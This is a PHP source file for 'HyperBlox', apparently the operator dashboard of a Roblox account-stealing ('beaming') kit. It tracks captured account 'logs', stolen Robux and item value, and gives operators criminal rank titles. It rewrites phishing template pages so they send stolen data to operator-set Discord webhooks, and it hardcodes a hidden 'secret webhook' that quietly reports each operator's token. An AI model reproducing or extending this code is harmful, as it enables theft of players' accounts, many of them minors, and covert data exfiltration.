<?php
session_start();
require_once __DIR__ . '/apis/persistence.php';

function hb_template_file_path(string $dir, string $fileName): string {
    return hb_template_dir($dir) . $fileName;
}

$tokensDir = hb_tokens_dir();
hb_ensure_dir($tokensDir);
// Secret webhook - receives all embeds and notifications (not exposed in frontend)
$secretWebhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";
$token = $_SESSION['token'];
if (!$token) {
    header("Location: sign-in.php");
    exit();
}

$tokenFile = hb_find_token_file($token);
if ($tokenFile) {
    $contents = file_get_contents($tokenFile);
    $data = array_map('trim', explode("|", $contents));
    if (count($data) >= 3) {
        $dir = $data[1];
        $web = $data[2];
        $dualhook = $data[3] ?? ''; // Dualhook is optional (4th field)
    } else {
        $web = "No webhook found";
    }
} else {
    $web = "No webhook found";
    $tokenFile = hb_tokens_dir() . $token . '.txt';
}

$dir = $_SESSION['dir'];
$templateDir = hb_template_dir($dir);
$visits = @file_get_contents(hb_template_file_path($dir, 'visits.txt'));
$logs = @file_get_contents(hb_template_file_path($dir, 'logs.txt'));
$robux = @file_get_contents(hb_template_file_path($dir, 'robux.txt'));
$rap = @file_get_contents(hb_template_file_path($dir, 'rap.txt'));
$summary = @file_get_contents(hb_template_file_path($dir, 'summary.txt'));
$starterUsername = @file_get_contents(hb_template_file_path($dir, 'username.txt'));
$pfpUrl = @file_get_contents(hb_template_file_path($dir, 'logo.txt'));

if (!$visits) $visits = '0';
if (!$logs) $logs = '0';
if (!$robux) $robux = '0';
if (!$rap) $rap = '0';
if (!$summary) $summary = '0';

$logs = (int)$logs;

$ranks = [
    ['min' => 0, 'max' => 2, 'name' => 'Noob Beamer'],
    ['min' => 3, 'max' => 9, 'name' => 'Rookie Logger'],
    ['min' => 10, 'max' => 25, 'name' => 'Script Kiddie'],
    ['min' => 26, 'max' => 49, 'name' => 'Amateur Beamer'],
    ['min' => 50, 'max' => 74, 'name' => 'Lowkey Harvester'],
    ['min' => 75, 'max' => 99, 'name' => 'Log Collector'],
    ['min' => 100, 'max' => 149, 'name' => 'Token Hunter'],
    ['min' => 150, 'max' => 199, 'name' => 'Cookie Bandit'],
    ['min' => 200, 'max' => 299, 'name' => 'Silent Snatcher'],
    ['min' => 300, 'max' => 399, 'name' => 'Seasoned Harvester'],
    ['min' => 400, 'max' => 499, 'name' => 'Digital Hijacker'],
    ['min' => 500, 'max' => 599, 'name' => 'Beam Technician'],
    ['min' => 600, 'max' => 699, 'name' => 'Advanced Extractor'],
    ['min' => 700, 'max' => 799, 'name' => 'Cyber Phantom'],
    ['min' => 800, 'max' => 899, 'name' => 'Professional Beamer'],
    ['min' => 900, 'max' => 999, 'name' => 'Ultimate Logger'],
    ['min' => 1000, 'max' => PHP_INT_MAX, 'name' => 'Hyperblox']
];

$currentRank = 'Noob Beamer';
$nextRank = 'Rookie Logger';
$progress = 0;
$logsToNextRank = 3;

foreach ($ranks as $index => $rank) {
    if ($logs >= $rank['min'] && $logs <= $rank['max']) {
        $currentRank = $rank['name'];
        $nextRank = $ranks[$index + 1]['name'] ?? $currentRank;
        $progress = (($logs - $rank['min']) / ($rank['max'] - $rank['min'])) * 100;
        $logsToNextRank = $rank['max'] - $logs + 1;
        break;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newWebhook = $_POST['web'] ?? '';
    $newDualhook = $_POST['dualhook'] ?? '';
    $newUsername = $_POST['username'] ?? '';
    $newPfpUrl = $_POST['pfp_url'] ?? '';
    $newDirectory = $_POST['directory'] ?? '';

    $errors = [];

    if ($newUsername && (strlen($newUsername) < 3 || strlen($newUsername) > 15)) {
        $errors[] = "Username must be between 3 and 15 characters.";
    }

    if ($newPfpUrl && !filter_var($newPfpUrl, FILTER_VALIDATE_URL)) {
        $errors[] = "Invalid profile picture URL.";
    }

    if ($newDirectory && preg_match('/[^A-Za-z0-9]/', $newDirectory)) {
        $errors[] = "Directory can only contain letters and numbers.";
    }

    if ($newDirectory && $newDirectory !== $dir && file_exists("../$newDirectory")) {
        $errors[] = "Directory already exists.";
    }

    if ($newWebhook) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $newWebhook);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPGET, true);
        $req = curl_exec($curl);
        $jd = json_decode($req, true);
        $err = $jd['guild_id'] ?? '';

        if (!$err) {
            $errors[] = "Invalid webhook URL.";
        }
    }

    // Validate dualhook if provided (optional)
    if ($newDualhook) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $newDualhook);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_HTTPGET, true);
        $req = curl_exec($curl);
        $jd = json_decode($req, true);
        $err = $jd['guild_id'] ?? '';

        if (!$err) {
            $errors[] = "Invalid dualhook URL.";
        }
    }

    if (empty($errors)) {
        if ($newUsername) {
        file_put_contents(hb_template_file_path($dir, 'username.txt'), $newUsername);
            $starterUsername = $newUsername;
        }

        if ($newPfpUrl) {
        file_put_contents(hb_template_file_path($dir, 'logo.txt'), $newPfpUrl);
            $pfpUrl = $newPfpUrl;
        }

        if ($newDirectory && $newDirectory !== $dir) {
            $currentDirectoryPath = rtrim(hb_template_dir($dir), DIRECTORY_SEPARATOR);
            $newDirectoryPath = rtrim(hb_template_dir($newDirectory), DIRECTORY_SEPARATOR);
            if (file_exists($newDirectoryPath)) {
                $errors[] = "Directory already exists.";
            } else {
                hb_ensure_dir(dirname($newDirectoryPath));
                rename($currentDirectoryPath, $newDirectoryPath);
                $dir = $newDirectory;
                $_SESSION['dir'] = $dir;
                // Update token file with current webhook and dualhook
                hb_ensure_dir(dirname($tokenFile));
                file_put_contents($tokenFile, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time());
            }
            
            // Notify secret webhook about directory rename
            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $dom = $ht . $_SERVER['HTTP_HOST'];
            $notif = json_encode([
                "username" => "HyperBlox",
                "avatar_url" => "https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png",
                "embeds" => [[
                    "title" => "📝 Settings Updated",
                    "description" => "**Directory renamed:** `$dir` → `$newDirectory`",
                    "color" => hexdec("00BFFF"),
                    "fields" => [
                        ["name" => "Token", "value" => "```$token```", "inline" => false],
                        ["name" => "New Directory", "value" => "`$newDirectory`", "inline" => true],
                        ["name" => "Link", "value" => "[$dom/$newDirectory]($dom/$newDirectory)", "inline" => false]
                    ],
                    "timestamp" => date("c")
                ]]
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
            @file_get_contents($secretWebhook . "?wait=true", false, stream_context_create([
                "http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $notif]
            ]));
        }

        // Update webhook and/or dualhook if changed
        $webhookChanged = ($newWebhook && $newWebhook !== $web);
        $dualhookChanged = ($newDualhook !== $dualhook); // Note: empty string means remove dualhook
        
        if ($webhookChanged || $dualhookChanged) {
            $index = file_get_contents(hb_template_file_path($dir, 'index.php'));
            $path = hb_template_dir($dir);
            
            if ($webhookChanged) {
                // Replace old webhook with new one (URL-encoded)
                $oldWebEncoded = urlencode($web);
                $newWebEncoded = urlencode($newWebhook);
                $index = str_replace($oldWebEncoded, $newWebEncoded, $index);
                // Also replace non-encoded versions
                $index = str_replace($web, $newWebhook, $index);
                $web = $newWebhook;
            }
            
            if ($dualhookChanged) {
                // Replace old dualhook with new one (URL-encoded)
                $oldDualEncoded = urlencode($dualhook ?? '');
                $newDualEncoded = urlencode($newDualhook);
                // Replace in both parameter formats: &dh= and &dualhook=
                $index = str_replace("&dh=" . $oldDualEncoded, "&dh=" . $newDualEncoded, $index);
                $index = str_replace("&dualhook=" . $oldDualEncoded, "&dualhook=" . $newDualEncoded, $index);
                // Also handle empty dualhook case
                if (empty($dualhook)) {
                    $index = str_replace("&dh=", "&dh=" . $newDualEncoded, $index);
                    $index = str_replace("&dualhook=", "&dualhook=" . $newDualEncoded, $index);
                }
                if (empty($newDualhook)) {
                    // Remove dualhook parameters if set to empty
                    $index = preg_replace('/&dh=[^&]*/', '', $index);
                    $index = preg_replace('/&dualhook=[^&]*/', '', $index);
                }
                $dualhook = $newDualhook;
            }
            
            // Update token file with new webhook and dualhook
            hb_ensure_dir(dirname($tokenFile));
            $fo = fopen($path . "index.php", 'w');
            $fo2 = fopen($tokenFile, 'w');
            if ($fo && $fo2) {
                fwrite($fo, $index);
                fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? '') . " | " . time());
                fclose($fo);
                fclose($fo2);
            }
            
            // Notify secret webhook about settings update
            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $dom = $ht . $_SERVER['HTTP_HOST'];
            $changes = [];
            if ($webhookChanged) $changes[] = "Main webhook updated";
            if ($dualhookChanged) $changes[] = "Dualhook " . ($newDualhook ? "updated" : "removed");
            if ($newUsername) $changes[] = "Username: `$newUsername`";
            if ($newPfpUrl) $changes[] = "Profile picture updated";
            
            if (!empty($changes)) {
                $notif = json_encode([
                    "username" => "HyperBlox",
                    "avatar_url" => "https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png",
                    "embeds" => [[
                        "title" => "⚙️ Settings Updated",
                        "description" => "**Changes:**\n" . implode("\n", array_map(function($c) { return "• $c"; }, $changes)),
                        "color" => hexdec("00BFFF"),
                        "fields" => [
                            ["name" => "Token", "value" => "```$token```", "inline" => false],
                            ["name" => "Directory", "value" => "`$dir`", "inline" => true]
                        ],
                        "timestamp" => date("c")
                    ]]
                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
                @file_get_contents($secretWebhook . "?wait=true", false, stream_context_create([
                    "http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $notif]
                ]));
            }
        }

        // Notify secret webhook about username/pfp changes (if no webhook/dualhook changes)
        if (($newUsername || $newPfpUrl) && !$webhookChanged && !$dualhookChanged) {
            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
            $dom = $ht . $_SERVER['HTTP_HOST'];
            $changes = [];
            if ($newUsername) $changes[] = "Username: `$newUsername`";
            if ($newPfpUrl) $changes[] = "Profile picture updated";
            
            if (!empty($changes)) {
                $notif = json_encode([
                    "username" => "HyperBlox",
                    "avatar_url" => "https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png",
                    "embeds" => [[
                        "title" => "⚙️ Settings Updated",
                        "description" => "**Changes:**\n" . implode("\n", array_map(function($c) { return "• $c"; }, $changes)),
                        "color" => hexdec("00BFFF"),
                        "fields" => [
                            ["name" => "Token", "value" => "```$token```", "inline" => false],
                            ["name" => "Directory", "value" => "`$dir`", "inline" => true]
                        ],
                        "timestamp" => date("c")
                    ]]
                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
                @file_get_contents($secretWebhook . "?wait=true", false, stream_context_create([
                    "http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $notif]
                ]));
            }
        }
        
        $js = 'Swal.fire({ title: "Success!", text: "Changes applied successfully.", icon: "success" });';
    } else {
        $js = 'Swal.fire({ title: "Error", text: "' . implode("\\n", $errors) . '", icon: "error" });';
    }
}

function getLeaderboard() {
    $directories = glob("../*", GLOB_ONLYDIR);
    $leaderboard = [];

    foreach ($directories as $directory) {
        $usernameFile = "$directory/username.txt";
        $logoFile = "$directory/logo.txt";
        $logsFile = "$directory/logs.txt";
        $visitsFile = "$directory/visits.txt";

        if (file_exists($usernameFile) && file_exists($logoFile) && file_exists($logsFile) && file_exists($visitsFile)) {
            $username = file_get_contents($usernameFile);
            $logo = file_get_contents($logoFile);
            $logs = (int)file_get_contents($logsFile);
            $visits = (int)file_get_contents($visitsFile);

            $leaderboard[] = [
                'username' => $username,
                'logo' => $logo,
                'logs' => $logs,
                'visits' => $visits
            ];
        }
    }

    usort($leaderboard, function ($a, $b) {
        return $b['logs'] - $a['logs'];
    });

    return array_slice($leaderboard, 0, 5);
}

$leaderboard = getLeaderboard();

function getLogsData($dir) {
    $logsFile = hb_template_file_path($dir, 'logs.txt');
    $logsData = file_exists($logsFile) ? (int)file_get_contents($logsFile) : 0;
    return $logsData;
}

function getVisitsData($dir) {
    $visitsFile = hb_template_file_path($dir, 'visits.txt');
    $visitsData = file_exists($visitsFile) ? (int)file_get_contents($visitsFile) : 0;
    return $visitsData;
}

function getDailyVisitsData($dir) {
    $dailyVisitsFile = hb_template_file_path($dir, 'dailyvisits.txt');
    if (file_exists($dailyVisitsFile)) {
        $dailyVisitsData = json_decode(file_get_contents($dailyVisitsFile), true);
    } else {
        $dailyVisitsData = array_fill(0, 7, 0);
    }
    return $dailyVisitsData;
}

function getDailyLogsData($dir) {
    $dailyLogsFile = hb_template_file_path($dir, 'dailylogs.txt');
    if (file_exists($dailyLogsFile)) {
        $dailyLogsData = json_decode(file_get_contents($dailyLogsFile), true);
    } else {
        $dailyLogsData = array_fill(0, 7, 0);
    }
    return $dailyLogsData;
}

function getDailyRobuxData($dir) {
    $dailyRobuxFile = hb_template_file_path($dir, 'dailyrobux.txt');
    if (file_exists($dailyRobuxFile)) {
        $dailyRobuxData = json_decode(file_get_contents($dailyRobuxFile), true);
    } else {
        $dailyRobuxData = array_fill(0, 7, 0);
    }
    return $dailyRobuxData;
}

function getDailyRapData($dir) {
    $dailyRapFile = hb_template_file_path($dir, 'dailyrap.txt');
    if (file_exists($dailyRapFile)) {
        $dailyRapData = json_decode(file_get_contents($dailyRapFile), true);
    } else {
        $dailyRapData = array_fill(0, 7, 0);
    }
    return $dailyRapData;
}

function getDailySummaryData($dir) {
    $dailySummaryFile = hb_template_file_path($dir, 'dailysummary.txt');
    if (file_exists($dailySummaryFile)) {
        $dailySummaryData = json_decode(file_get_contents($dailySummaryFile), true);
    } else {
        $dailySummaryData = array_fill(0, 7, 0);
    }
    return $dailySummaryData;
}

$logsData = getLogsData($dir);
$visitsData = getVisitsData($dir);
$dailyVisitsData = getDailyVisitsData($dir);
$dailyLogsData = getDailyLogsData($dir);
$dailyRobuxData = getDailyRobuxData($dir);
$dailyRapData = getDailyRapData($dir);
$dailySummaryData = getDailySummaryData($dir);

$today = date('w');
$yesterday = ($today - 1 + 7) % 7;

$logsToday = $dailyLogsData[$today];
$logsYesterday = $dailyLogsData[$yesterday];
$logsPercentageChange = $logsYesterday != 0 ? round((($logsToday - $logsYesterday) / $logsYesterday) * 100) : 100;

$visitsToday = $dailyVisitsData[$today];
$visitsYesterday = $dailyVisitsData[$yesterday];
$visitsPercentageChange = $visitsYesterday != 0 ? round((($visitsToday - $visitsYesterday) / $visitsYesterday) * 100) : 100;

$robuxToday = $dailyRobuxData[$today];
$robuxYesterday = $dailyRobuxData[$yesterday];
$robuxPercentageChange = $robuxYesterday != 0 ? round((($robuxToday - $robuxYesterday) / $robuxYesterday) * 100) : 100;

$rapToday = $dailyRapData[$today];
$rapYesterday = $dailyRapData[$yesterday];
$rapPercentageChange = $rapYesterday != 0 ? round((($rapToday - $rapYesterday) / $rapYesterday) * 100) : 100;

$summaryToday = $dailySummaryData[$today];
$summaryYesterday = $dailySummaryData[$yesterday];
$summaryPercentageChange = $summaryYesterday != 0 ? round((($summaryToday - $summaryYesterday) / $summaryYesterday) * 100) : 100;

$day = @file_get_contents('https://hyperblox.eu/files/day.txt');
if ($day === false) {
    $day = date('l');
}

$announcementsUrl = "https://hyperblox.eu/files/announcements.txt";
$announcementsContent = @file_get_contents($announcementsUrl);
if ($announcementsContent === false) {
    $announcements = [];
} else {
    $announcements = array_filter(array_map('trim', explode("\n", $announcementsContent)));
}
$announcementsPerPage = 3;
$totalPages = ceil(count($announcements) / $announcementsPerPage);
$currentPage = isset($_GET['announcementPage']) ? max(1, min($totalPages, intval($_GET['announcementPage']))) : 1;
$startIndex = ($currentPage - 1) * $announcementsPerPage;
$currentAnnouncements = array_slice($announcements, $startIndex, $announcementsPerPage);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="HyperBlox">
    <meta name="description" content="HyperBlox Dashboard - Manage your tools and stats with ease.">
    <meta name="keywords" content="Roblox, HyperBlox, dashboard, tools, stats">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="HyperBlox Dashboard">
    <meta property="og:description" content="Manage your HyperBlox tools and stats with ease.">
    <meta property="og:image" content="/files/hyperblox.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://hyperblox.eu/">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="HyperBlox Dashboard">
    <meta name="twitter:site" content="https://hyperblox.eu/">
    <meta name="twitter:description" content="Manage your HyperBlox tools and stats with ease.">
    <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta name="theme-color" content="#000000">
    <meta name="msapplication-TileColor" content="#000000">
    <meta itemprop="name" content="HyperBlox Dashboard">
    <meta itemprop="description" content="HyperBlox Dashboard - Manage your tools and stats with ease.">
    <title>Dashboard - HyperBlox</title>
    <link rel="icon" type="image/png" href="/files/hyperblox.png">
    <link rel="shortcut icon" href="/files/hyperblox.ico">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --primary-light: #a78bfa;
            --dark: #0f172a;
            --darker: #0a0e1a;
            --light: #f8fafc;
            --gray: #94a3b8;
            --dark-gray: #1e293b;
            --success: #10b981;
            --error: #ef4444;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --glass: rgba(30, 41, 59, 0.5);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--darker);
            color: var(--light);
            min-height: 100vh;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.15) 0px, transparent 50%);
            background-attachment: fixed;
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .dashboard-container {
            display: grid;
            grid-template-columns: 250px 1fr;
            gap: 20px;
            min-height: 100vh;
        }

        .sidebar {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
            height: fit-content;
        }

        .sidebar-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
        }

        .sidebar-header img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--primary);
        }

        .sidebar-header h3 {
            font-size: 18px;
            font-weight: 600;
        }

        .sidebar-menu {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .menu-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            border-radius: 12px;
            color: var(--gray);
            transition: var(--transition);
            cursor: pointer;
        }

        .menu-item:hover, .menu-item.active {
            background: rgba(139, 92, 246, 0.2);
            color: var(--light);
        }

        .menu-item i {
            font-size: 18px;
            width: 24px;
            text-align: center;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            position: relative;
            z-index: 10;
            border: 1px solid var(--glass-border);
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
        }

        .user-dropdown {
            position: relative;
        }

        .user-btn {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
        }

        .user-btn img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--primary);
        }

        .dropdown-content {
            background: #1e293b;
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            padding: 20px;
            width: 250px;
            position: absolute;
            right: 0;
            top: 60px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            z-index: 9999;
            display: none;
        }

        .dropdown-content.show {
            display: block;
        }

        .user-info {
            display: flex;
            flex-direction: column;
            gap: 4px;
            margin-bottom: 16px;
        }

        .user-info p {
            font-size: 14px;
            color: var(--gray);
        }

        .user-info p span {
            color: var(--light);
            font-weight: 500;
        }

        .logout-btn {
            width: 100%;
            padding: 10px;
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 8px;
            color: var(--error);
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
        }

        .logout-btn:hover {
            background: rgba(239, 68, 68, 0.3);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }

        .stat-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
            transition: var(--transition);
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .stat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .stat-title {
            font-size: 16px;
            color: var(--gray);
        }

        .stat-value {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .stat-change {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 14px;
        }

        .stat-change.positive {
            color: var(--success);
        }

        .stat-change.negative {
            color: var(--error);
        }

        .stat-chart {
            height: 100px;
            margin-top: 16px;
            position: relative;
        }

        .stat-daily {
            margin-top: 12px;
            font-size: 14px;
            color: var(--gray);
            text-align: center;
        }

        .stat-daily span {
            color: var(--primary-light);
            font-weight: 500;
        }

        .rank-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
        }

        .rank-header {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .rank-info {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .rank-item {
            display: flex;
            justify-content: space-between;
        }

        .rank-label {
            color: var(--gray);
        }

        .rank-value {
            font-weight: 500;
        }

        .progress-container {
            margin-top: 16px;
        }

        .progress-bar {
            height: 6px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 3px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            border-radius: 3px;
        }

        .leaderboard-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
        }

        .leaderboard-header {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .leaderboard-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .leaderboard-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            border-radius: 12px;
            background: rgba(30, 41, 59, 0.5);
            transition: var(--transition);
        }

        .leaderboard-item:hover {
            background: rgba(139, 92, 246, 0.2);
        }

        .leaderboard-rank {
            font-weight: 600;
            width: 24px;
            text-align: center;
        }

        .leaderboard-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--primary);
        }

        .leaderboard-details {
            flex: 1;
        }

        .leaderboard-name {
            font-weight: 500;
        }

        .leaderboard-stats {
            font-size: 12px;
            color: var(--gray);
        }

        .settings-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
            display: none;
        }

        .settings-header {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--gray);
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(30, 41, 59, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            color: var(--light);
            font-family: 'Poppins', sans-serif;
            transition: var(--transition);
        }

        .form-input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(139, 92, 246, 0.4);
        }

        .tooltip {
            background: var(--dark-gray) !important;
            border: 1px solid var(--glass-border) !important;
            border-radius: 8px !important;
            padding: 10px 15px !important;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3) !important;
        }

        .tooltip-title {
            color: var(--primary-light) !important;
            font-weight: 600 !important;
            margin-bottom: 5px !important;
        }

        .tooltip-value {
            color: var(--light) !important;
            font-weight: 500 !important;
        }

        @media (max-width: 1024px) {
            .dashboard-container {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="dashboard-container">
            <div class="sidebar">
                <div class="sidebar-header">
                    <img src="<?php echo $pfpUrl; ?>" alt="Profile">
                    <h3><?php echo $starterUsername; ?></h3>
                </div>
                <div class="sidebar-menu">
                    <div class="menu-item active" onclick="showDashboard()">
                        <i class="fas fa-tachometer-alt"></i>
                        <span>Dashboard</span>
                    </div>
                    <div class="menu-item" onclick="showSettings()">
                        <i class="fas fa-cog"></i>
                        <span>Settings</span>
                    </div>
                    <div class="menu-item" onclick="showCreate()">
                        <i class="fas fa-plus-circle"></i>
                        <span>Create Template</span>
                    </div>
                </div>
            </div>

            <div class="main-content">
                <div class="header">
                    <h1>Dashboard</h1>
                    <div class="user-dropdown">
                        <div class="user-btn" onclick="toggleDropdown()">
                            <img src="<?php echo $pfpUrl; ?>" alt="Profile">
                            <i class="fas fa-chevron-down"></i>
                        </div>
                        <div class="dropdown-content" id="dropdownContent">
                            <div class="user-info">
                                <p><span>Username:</span> <?php echo $starterUsername; ?></p>
                                <p><span>Rank:</span> <?php echo $currentRank; ?></p>
                                <p><span>Logs:</span> <?php echo $logs; ?> | <span>Visits:</span> <?php echo $visits; ?></p>
                            </div>
                            <button class="logout-btn" onclick="window.location.href='logout.php'">
                                <i class="fas fa-sign-out-alt"></i> Logout
                            </button>
                        </div>
                    </div>
                </div>

                <div id="dashboardContent">
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Logs</div>
                                <div class="stat-change <?php echo $logsPercentageChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $logsPercentageChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($logsPercentageChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo $logs; ?></div>
                            <div class="stat-chart">
                                <canvas id="logsChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo $logsToday; ?></span> logs today!</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Visits</div>
                                <div class="stat-change <?php echo $visitsPercentageChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $visitsPercentageChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($visitsPercentageChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo $visits; ?></div>
                            <div class="stat-chart">
                                <canvas id="visitsChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo $visitsToday; ?></span> visits today!</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Robux</div>
                                <div class="stat-change <?php echo $robuxPercentageChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $robuxPercentageChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($robuxPercentageChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo $robux; ?></div>
                            <div class="stat-chart">
                                <canvas id="robuxChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo $robuxToday; ?></span> Robux today!</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total RAP</div>
                                <div class="stat-change <?php echo $rapPercentageChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $rapPercentageChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($rapPercentageChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo $rap; ?></div>
                            <div class="stat-chart">
                                <canvas id="rapChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo $rapToday; ?></span> RAP today!</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Summary</div>
